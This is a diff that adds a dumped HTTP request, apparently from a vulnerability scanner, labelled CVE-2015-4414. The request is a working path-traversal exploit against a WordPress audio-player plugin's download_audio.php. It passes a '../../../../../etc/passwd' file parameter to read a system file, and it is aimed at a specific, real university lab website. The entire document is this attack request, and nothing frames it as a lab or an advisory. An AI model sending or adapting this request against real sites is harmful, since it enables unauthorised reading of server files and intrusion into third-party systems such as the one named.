@@ -1,0 +1,12 @@
+[CVE-2015-4414] Dumped HTTP request for https://lecao-lab.science.unimelb.edu.au/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd
+
+
+GET /wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd HTTP/1.1
+Host: lecao-lab.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
